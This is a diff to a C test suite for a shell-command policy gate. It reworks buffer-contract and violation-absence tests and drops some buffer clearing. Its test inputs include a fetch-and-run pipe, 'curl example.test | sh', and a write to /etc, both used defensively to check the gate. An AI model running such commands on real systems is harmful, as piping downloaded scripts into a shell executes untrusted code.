@@ -256,7 +256,8 @@ static sg_error_t add_exact_outer_rule(sg_gate_t *gate, const char *command) {
 }
 
 static sg_error_t eval_cmd(sg_gate_t *g, const char *cmd, sg_result_t *r) {
-  memset(eval_buf, 0, sizeof(eval_buf));
+  /* The evaluation buffer is reusable without clearing; result strings are
+   * consumed before the next evaluation overwrites its storage. */
   return sg_gate_evaluate(g, cmd, strlen(cmd), eval_buf, sizeof(eval_buf), r);
 }
 
@@ -358,7 +359,6 @@ static sg_error_t eval_with_prefix(sg_gate_t *gate, const char *command,
   size_t buffer_size = eval_buffer_size_for_prefix(command, prefix_size);
   /* Prefix tests require a representable fixture buffer before evaluation. */
   ASSERT(buffer_size != 0);
-  memset(eval_buf, 0, buffer_size);
   return sg_gate_evaluate(gate, command, strlen(command), eval_buf, buffer_size,
                           result);
 }
@@ -556,8 +556,6 @@ TEST(shell_list_parse_boundary_contract) {
   ASSERT_SG_OK(eval_cmd(gate, "left", &result));
   ASSERT(result.subcommand_count == 1);
   for (size_t i = 0; i < sizeof(invalid) / sizeof(invalid[0]); i++) {
-    memset(eval_buf, 0, sizeof(eval_buf));
-    memset(&result, 0, sizeof(result));
     ASSERT(sg_gate_evaluate(gate, invalid[i], strlen(invalid[i]), eval_buf,
                             sizeof(eval_buf), &result) == SG_ERR_PARSE);
     ASSERT(result.verdict == SG_VERDICT_REJECT);
@@ -7357,13 +7355,32 @@ TEST(buffer_contract_matrix) {
 
   for (size_t repeat = 0; repeat < 2; repeat++) {
     for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
-      sg_result_t r;
+      sg_result_t r = {0};
       memset(eval_buf, 0xFF, sizeof(eval_buf));
-      ASSERT(eval_with_prefix(g, cases[i].command, cases[i].buffer_size, &r) ==
-             SG_ERR_TRUNC);
+      sg_error_t status =
+          eval_with_prefix(g, cases[i].command, cases[i].buffer_size, &r);
+      if (status != SG_ERR_TRUNC || !r.truncated ||
+          r.verdict != SG_VERDICT_UNDETERMINED)
+        fprintf(stderr,
+                "prefix case %zu repeat %zu: %s, prefix %zu, "
+                "status %d, truncated %d, verdict %d\n",
+                i, repeat, cases[i].command, cases[i].buffer_size, status,
+                r.truncated, r.verdict);
+      ASSERT(status == SG_ERR_TRUNC);
       ASSERT(r.truncated);
       ASSERT(r.verdict == SG_VERDICT_UNDETERMINED);
-      ASSERT(memchr(eval_buf, '\0', cases[i].buffer_size) != NULL);
+      size_t size =
+          eval_buffer_size_for_prefix(cases[i].command, cases[i].buffer_size);
+      size_t prefix = eval_result_prefix_size(cases[i].command, size);
+      /* An empty partial result need not write a string. Every string it
+       * does publish must be terminated inside the usable prefix. */
+      bool fields_valid = result_fields_stay_in_prefix(&r, prefix);
+      if (!fields_valid)
+        fprintf(stderr,
+                "prefix case %zu repeat %zu: %s, invalid result "
+                "fields in %zu-byte prefix\n",
+                i, repeat, cases[i].command, prefix);
+      ASSERT(fields_valid);
     }
   }
 
@@ -7371,7 +7388,11 @@ TEST(buffer_contract_matrix) {
   ASSERT(eval_with_prefix(g, "curl example.test | sh", 2, &violation_result) ==
          SG_ERR_TRUNC);
   ASSERT(violation_result.truncated);
-  ASSERT(memchr(eval_buf, '\0', 2) != NULL);
+  ASSERT(result_fields_stay_in_prefix(
+      &violation_result,
+      eval_result_prefix_size(
+          "curl example.test | sh",
+          eval_buffer_size_for_prefix("curl example.test | sh", 2))));
 
   static const struct {
     const char *command;
@@ -7442,7 +7463,10 @@ TEST(buffer_contract_matrix) {
   ASSERT(result.truncated);
   ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
   ASSERT_EQ_UINT(test_anomaly_vocabulary(g), anomaly_vocab_before);
-  ASSERT(memchr(eval_buf, '\0', 16) != NULL);
+  ASSERT(result_fields_stay_in_prefix(
+      &result,
+      eval_result_prefix_size(
+          anomaly_command, eval_buffer_size_for_prefix(anomaly_command, 16))));
 
   size_t hint = sg_gate_evaluate_size_hint(strlen(anomaly_command));
   char *hint_buffer = malloc(hint);
@@ -12857,21 +12881,28 @@ TEST(violation_absence_matrix) {
                {false, "ls"},
                {false, "echo hello > /etc/badfile"}};
 
+  sg_gate_t *enabled = gate_with_violations();
+  sg_gate_t *disabled = sg_gate_new();
+  ASSERT(enabled != NULL && disabled != NULL);
+  ASSERT_ST_OK(test_policy_replace_cpl(disabled, false, "ls", false));
+  ASSERT_ST_OK(test_policy_replace_cpl(disabled, false, "echo *", false));
   for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
-    sg_gate_t *gate = cases[i].enabled ? gate_with_violations() : sg_gate_new();
-    ASSERT(gate != NULL);
-    if (!cases[i].enabled) {
-      ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "ls", false));
-      ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "echo *", false));
-    }
+    sg_gate_t *gate = cases[i].enabled ? enabled : disabled;
     sg_result_t result;
-    ASSERT(eval_cmd(gate, cases[i].command, &result) == SG_OK);
+    sg_error_t status = eval_cmd(gate, cases[i].command, &result);
+    if (status != SG_OK || !violation_result_is_consistent(&result) ||
+        result.has_violations || result.violation_count != 0 ||
+        result.violation_type_flags != 0)
+      fprintf(stderr, "violation absence case %zu enabled %d: %s status %d\n",
+              i, cases[i].enabled, cases[i].command, status);
+    ASSERT(status == SG_OK);
     ASSERT(violation_result_is_consistent(&result));
     ASSERT(!result.has_violations);
     ASSERT(result.violation_count == 0);
     ASSERT(result.violation_type_flags == 0);
-    sg_gate_free(gate);
   }
+  sg_gate_free(disabled);
+  sg_gate_free(enabled);
 }
 
 /* --- PROPERTY TESTS --- */
